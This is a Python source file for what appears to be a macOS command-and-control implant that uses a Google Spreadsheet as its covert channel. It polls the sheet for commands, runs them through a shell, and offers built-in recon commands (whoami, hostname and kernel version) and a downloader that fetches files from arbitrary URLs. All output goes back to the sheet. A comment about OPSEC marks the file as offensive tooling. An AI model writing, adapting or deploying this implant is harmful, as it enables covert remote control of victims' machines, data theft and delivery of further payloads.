import csv
import json
import gspread
import os
import subprocess
import pprint
import time
import sys
from urllib import request

#insert the path and filename for the json service account key
gc = gspread.service_account(filename='')

#insert the unique sheet key found in the URL for the google spreadsheet
sh = gc.open_by_key('')
worksheet = sh.sheet1

# Built-in command for ls and will probably be removed in the future since ls is pretty OPSEC safe
def cmd_ls(directory):
# desired directory path
     my_input = directory 
# Get the list of all files and directories in provided directory
     path = my_input
     dir_list = os.listdir(path)
     print("Files and directories in '", path, "' :")
     print(dir_list)
     cmd_output = dir_list
     #record time
     named_tuple = time.localtime() # get struct_time
     exec_time = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)

     #record in log
     logWrite = exec_time
     b = '\n'
     c = b.join(cmd_output)
     worksheet.update_cell(target_row, 2, c) 
     worksheet.update_cell(target_row, 3, exec_time)

def update_sheet(results):
     cmd_output = results
     #record time
     named_tuple = time.localtime() # get struct_time
     exec_time = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)

     #record in log
     logWrite = exec_time
     worksheet.update_cell(target_row, 2, cmd_output)
     worksheet.update_cell(target_row, 3, exec_time)

# Built-in command for getlogin (whoami)
def cmd_whoami():
     # Get the user currently running this process
     loginid = os.getlogin()
     cmd_output = loginid 
     update_sheet(cmd_output)

# Built-in command for host recon info
def cmd_hostinfo():
     # Get typical elements of uname -a 
     gethostinfo = subprocess.check_output(['sysctl', 'kern.version'])
     cmd_output = gethostinfo

     cmd = 'sysctl kern.hostname'
     gethostname = os.system(cmd)
     update_sheet(cmd_output.decode())

# Built-in command for downloading files
def cmd_pdownload(url,lfile):
     # remote URL
     remote_url = url
     # name of file to write to
     local_file = lfile
     # download and write file
     try:
          request.urlretrieve(remote_url, local_file)
     except:
          print("Error: Failed to download or save file")
     
     file_exists = os.path.exists(local_file)
     if (file_exists):
         success_msg = "Success"
     else: 
          success_msg = "Failed"
     
     update_sheet(success_msg)

# Get next available row
def next_available_row(worksheet):
    str_list = list(filter(None, worksheet.col_values(1)))
    return str(len(str_list)+1)

# Get next row to operate on
next_row = next_available_row(worksheet)
target_row = int(next_row)
target_row = target_row - 1
next_row = "A" + str(target_row)

#get command from spreadsheet
my_cmd = worksheet.acell(next_row).value
print("Executing...", my_cmd)

# Check if built-in command is being sent
key_cmd_check = my_cmd.split(' ', 1)
if (str(key_cmd_check[0]) == 'pls'):
     print("using built-in ls")
     cmd_ls(str(key_cmd_check[1]))
elif (str(key_cmd_check[0]) == 'pwhoami'):
     print("using built-in pwhoami") 
     cmd_whoami()
elif (str(key_cmd_check[0]) == 'puname'):
     print("using built-in puname")
     cmd_hostinfo()
elif (str(key_cmd_check[0]) == 'pdownload'):
     print("using built-in pdownload")
     url_file_split = key_cmd_check[1].split( )
     print("Fetching: " + url_file_split[0])
     print("Writing: " + url_file_split[1])
     cmd_pdownload(url_file_split[0],url_file_split[1])
else: 
     #run the command from the spreadsheet
     p = subprocess.run([my_cmd], shell=True, stdout=subprocess.PIPE)
     cmd_output = p.stdout 
     print(cmd_output.decode())
     update_sheet(cmd_output.decode())

